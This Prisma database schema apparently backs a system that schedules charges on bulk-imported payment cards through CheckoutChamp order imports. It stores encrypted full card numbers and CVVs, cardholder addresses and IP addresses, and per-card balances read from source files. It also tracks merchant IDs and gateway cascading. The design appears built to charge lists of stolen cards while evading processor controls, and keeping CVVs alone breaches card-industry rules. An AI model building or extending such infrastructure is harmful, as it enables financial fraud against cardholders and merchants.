generator client {
  provider   = "prisma-client-js"
  engineType = "client"
}

datasource db {
  provider = "sqlite"
  url      = env("DATABASE_URL")
}

// ---------------------------------------------------------------------------
// LEDGER-V2 SCHEMA (the rebuild).
//
// The old model stored everything in JSON blobs and made a `schedules` row do
// double duty (intent + fire result, with an append-only fire_attempts array).
// This model splits that cleanly:
//
//   • Real indexed columns instead of JSON blobs.
//   • Card carries a DENORMALIZED `remainingBalance` (kept in sync on the
//     charge/reserve path) so availability is `WHERE remaining_balance > 0`
//     instead of a GROUP BY over every schedule.
//   • `schedules` = the MUTABLE intent + current status (pending|processing|done).
//   • `transactions` = an APPEND-ONLY ledger; one row per CheckoutChamp attempt.
//     Flipping a schedule's status can never erase a charge record.
//
// relationMode = "prisma": no DB-level foreign keys (D1-friendly); integrity is
// enforced in the service layer. Relations are modelled for query ergonomics.
// ---------------------------------------------------------------------------

model AdminUser {
  id           String   @id @default(uuid())
  email        String   @unique
  passwordHash String   @map("password_hash")
  createdAt    DateTime @default(now()) @map("created_at")

  @@map("admin_users")
}

model Account {
  id                String   @id @default(uuid())
  name              String
  apiUrl            String   @map("api_url")
  loginIdEncrypted  String   @map("login_id_encrypted")
  passwordEncrypted String   @map("password_encrypted")
  createdAt         DateTime @default(now()) @map("created_at")
  flows             Flow[]

  @@map("accounts")
}

model Card {
  id           String  @id @default(uuid())
  /// lower(first)|lower(last)|pan_last4|exp_month|exp_year
  identityKey  String  @unique @map("identity_key")
  panLast4     String  @map("pan_last4")
  panEnc       String  @map("pan_enc")
  cvvEnc       String  @map("cvv_enc")
  expMonth     String  @map("exp_month")
  expYear      String  @map("exp_year")
  firstName    String  @map("first_name")
  lastName     String  @map("last_name")
  email        String?
  phone        String?
  ipAddress    String? @map("ip_address")
  street       String?
  city         String?
  state        String?
  zipCode      String? @map("zip_code")
  /// balance model. isUnlimited=1 → infinite (once per flow); else startBalance
  /// is the starting balance and remainingBalance is kept in sync as charges
  /// reserve/commit. A card is usable while unlimited OR remainingBalance > 0.
  isUnlimited      Boolean @default(false) @map("is_unlimited")
  startBalance     Float?  @map("start_balance")
  remainingBalance Float?  @map("remaining_balance")
  sourceFile   String?  @map("source_file")
  createdAt    DateTime @default(now()) @map("created_at")

  schedules    Schedule[]
  transactions Transaction[]

  @@index([panLast4])
  @@index([remainingBalance])
  @@index([sourceFile])
  @@map("cards")
}

model Flow {
  id             String   @id @default(uuid())
  name           String
  accountId      String   @map("account_id")
  account        Account  @relation(fields: [accountId], references: [id])
  startDate      DateTime @map("start_date")
  endDate        DateTime @map("end_date")
  /// active | paused | completed
  status         String   @default("active")
  pausedAt       DateTime? @map("paused_at")
  lastChargedAt  DateTime? @map("last_charged_at")
  ccGatewayId    String?  @map("cc_gateway_id")
  ccGatewayName  String?  @map("cc_gateway_name")
  ccCampaignId   String?  @map("cc_campaign_id")
  ccCampaignName String?  @map("cc_campaign_name")
  totalCards     Int      @default(0) @map("total_cards")
  createdAt      DateTime @default(now()) @map("created_at")

  products     FlowProduct[]
  schedules    Schedule[]
  transactions Transaction[]

  @@index([status])
  @@map("flows")
}

model FlowProduct {
  id        String @id @default(uuid())
  flowId    String @map("flow_id")
  flow      Flow   @relation(fields: [flowId], references: [id])
  productId String @map("product_id")
  name      String?
  price     Float
  count     Int    @default(0)

  @@index([flowId])
  @@map("flow_products")
}

model Schedule {
  id           String   @id @default(uuid())
  cardId       String   @map("card_id")
  card         Card     @relation(fields: [cardId], references: [id])
  flowId       String   @map("flow_id")
  flow         Flow     @relation(fields: [flowId], references: [id])
  scheduledFor DateTime @map("scheduled_for")
  /// pending → processing → done. The CC verdict lives in `transactions`.
  status       String   @default("pending")
  productId    String?  @map("product_id")
  productName  String?  @map("product_name")
  price        Float
  ccGatewayId  String?  @map("cc_gateway_id")
  createdAt    DateTime @default(now()) @map("created_at")

  transactions Transaction[]

  @@index([status, scheduledFor])
  @@index([flowId])
  @@index([cardId])
  @@map("schedules")
}

/// APPEND-ONLY ledger. One row per CheckoutChamp /order/import/ attempt.
/// Never updated, never deleted — the permanent record of what happened to money.
model Transaction {
  id          String   @id @default(uuid())
  scheduleId  String   @map("schedule_id")
  schedule    Schedule @relation(fields: [scheduleId], references: [id])
  cardId      String   @map("card_id")
  card        Card     @relation(fields: [cardId], references: [id])
  flowId      String   @map("flow_id")
  flow        Flow     @relation(fields: [flowId], references: [id])
  firedAt     DateTime @map("fired_at")
  success     Boolean  @default(false)
  orderId     String?  @map("order_id")
  amountPaid  Float?   @map("amount_paid")
  plannedMid  String?  @map("planned_mid")
  actualMid   String?  @map("actual_mid")
  cascadeUsed Boolean  @default(false) @map("cascade_used")
  productId   String?  @map("product_id")
  productName String?  @map("product_name")
  price       Float?
  ccCode      String?  @map("cc_code")
  ccMessage   String?  @map("cc_message")
  rawResponse String?  @map("raw_response")
  createdAt   DateTime @default(now()) @map("created_at")

  @@index([scheduleId])
  @@index([flowId])
  @@index([cardId])
  @@index([success])
  @@index([firedAt])
  @@map("transactions")
}
